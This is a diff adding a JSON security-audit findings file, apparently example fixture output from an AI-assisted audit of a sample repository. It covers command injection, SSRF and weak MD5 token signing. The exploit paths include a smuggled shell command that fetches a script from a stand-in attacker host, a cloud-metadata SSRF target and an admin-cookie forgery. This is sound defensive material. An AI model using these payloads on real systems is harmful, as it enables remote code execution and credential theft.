@@ -1,0 +1,120 @@
+{
+  "audit_id": "audit-2026-11-05-example",
+  "repo": "examples/fixture-repo",
+  "generated_at": "2026-11-05T09:00:00+00:00",
+  "models": {
+    "discovery": "model-A (any provider)",
+    "validation": "model-B (independent of discovery)"
+  },
+  "coverage": [
+    { "area": "src/", "attack_class": "injection", "status": "findings", "notes": "command injection confirmed in upload path" },
+    { "area": "src/", "attack_class": "ssrf", "status": "findings", "notes": "outbound fetch lacks allowlist; no test env to confirm" },
+    { "area": "lib/", "attack_class": "crypto", "status": "investigated", "notes": "md5 token signing found; impact assessment pending" },
+    { "area": "lib/", "attack_class": "auth-bypass", "status": "no-issues", "notes": "no auth logic in this fixture area" }
+  ],
+  "findings": [
+    {
+      "id": "SA-command-injection-dcbc2346",
+      "title": "Command injection in thumbnail generation via upload filename",
+      "description": "handleUpload interpolates the user-controlled query parameter `name` into a shell command executed via exec(). Source evidence: the value flows from req.query (public, unauthenticated) through path.join into exec() with no escaping. The path.join prefix does not neutralize metacharacters inside the filename.",
+      "attack_class": "command-injection",
+      "files": [
+        {
+          "path": "src/upload.ts",
+          "lines": [8, 9, 10],
+          "function": "handleUpload",
+          "evidence": "exec(`convert ${dest} -resize 1024 ${dest}.png`);"
+        }
+      ],
+      "functions": ["handleUpload"],
+      "attacker_capabilities": "anonymous-remote: arbitrary visitor able to GET /upload?name=...; no credentials required",
+      "trust_boundary": "network -> application (untrusted HTTP input executed by the OS shell)",
+      "exploit_path": "GET /upload?name=x;curl${IFS}attacker.example/p.sh — dest becomes /var/uploads/x;curl..., the backtick command runs ImageMagick's arguments through a shell, executing attacker text as a second command",
+      "impact": "Remote code execution with the application server's privileges; full takeover of the upload host.",
+      "severity": "critical",
+      "confidence": "high",
+      "status": "confirmed",
+      "reproduction": [
+        "Start the fixture app locally (authorized test instance only).",
+        "curl 'http://127.0.0.1:3000/upload?name=x;id'",
+        "Observe the output of id(1) appearing in the converted-file error log / response side effects."
+      ],
+      "poc_ref": "pocs/SA-command-injection-dcbc2346/poc.md",
+      "evidence": [
+        "pocs/SA-command-injection-dcbc2346/poc.md — captured request and command output"
+      ],
+      "validation": {
+        "status": "validated",
+        "validator": "independent model-B, fresh context, findings.json + source only",
+        "checked_at": "2026-11-05T10:15:00+00:00",
+        "notes": "Confirmed the path is reachable from the public router, that the shell is invoked (not an argument-vector API), and that path.join does not sanitize. No earlier finding duplicates it."
+      },
+      "production_reachable": true,
+      "tags": ["rce", "public-endpoint"]
+    },
+    {
+      "id": "SA-ssrf-aaa31d02",
+      "title": "Unrestricted outbound request to tenant-supplied webhook URLs",
+      "description": "fetch_url passes a tenant-supplied URL directly to urlopen with no scheme or host allowlist. Source evidence supports SSRF from the application host (metadata endpoints, internal services). Not yet executed: the audit environment has no running instance of this service, so the PoC was not run.",
+      "attack_class": "ssrf",
+      "files": [
+        {
+          "path": "src/webhook.py",
+          "lines": [6],
+          "function": "fetch_url",
+          "evidence": "with urllib.request.urlopen(user_url) as response:"
+        }
+      ],
+      "functions": ["fetch_url"],
+      "attacker_capabilities": "authenticated-low-priv: any tenant able to register a webhook target",
+      "trust_boundary": "user -> application -> internal network (server-side fetch pivots into internal space)",
+      "exploit_path": "Register webhook url=http://169.254.169.254/latest/meta-data/ (or any internal service); trigger the webhook test; read the fetched body returned to the tenant.",
+      "impact": "Read access to cloud metadata credentials and internal-only services from the application host.",
+      "severity": "high",
+      "confidence": "medium",
+      "status": "unverified",
+      "reproduction": [
+        "NOT EXECUTED — missing prerequisite: no running test instance of the webhook service in the audit environment.",
+        "To verify: deploy the fixture in an isolated network, register url=http://169.254.169.254/latest/meta-data/, trigger the webhook, and observe the metadata response body returned to the tenant."
+      ],
+      "evidence": [],
+      "validation": {
+        "status": "pending"
+      },
+      "production_reachable": false,
+      "tags": ["ssrf", "metadata"]
+    },
+    {
+      "id": "SA-crypto-8e4067e4",
+      "title": "Session tokens signed with unsalted MD5",
+      "description": "signToken hashes the payload with MD5 and no keyed construction, so anyone who can observe a token can forge tokens for arbitrary payloads by hashing the desired payload themselves. Hypothesis pending validation: the audit has not yet confirmed whether these tokens grant anything beyond a convenience cookie.",
+      "attack_class": "crypto",
+      "files": [
+        {
+          "path": "lib/session.js",
+          "lines": [5],
+          "function": "signToken",
+          "evidence": "return crypto.createHash(\"md5\").update(JSON.stringify(payload)).digest(\"hex\");"
+        }
+      ],
+      "functions": ["signToken"],
+      "attacker_capabilities": "anonymous-remote: any party that receives or guesses a token (they are not keyed)",
+      "trust_boundary": "network -> application (forged token accepted as authentication material)",
+      "exploit_path": "Compute md5(JSON.stringify({user:'admin'})) and present it as the remember-me cookie.",
+      "impact": "Authentication forgery, assuming the cookie is accepted as an auth credential — validation must confirm the verification path.",
+      "severity": "high",
+      "confidence": "low",
+      "status": "hypothesis",
+      "reproduction": [
+        "Pending: locate the verification path for this cookie and confirm md5(payload) is accepted without a server-side secret.",
+        "Then replay a forged cookie against an isolated test instance."
+      ],
+      "evidence": [],
+      "validation": {
+        "status": "pending"
+      },
+      "production_reachable": false,
+      "tags": ["auth", "weak-hash"]
+    }
+  ]
+}
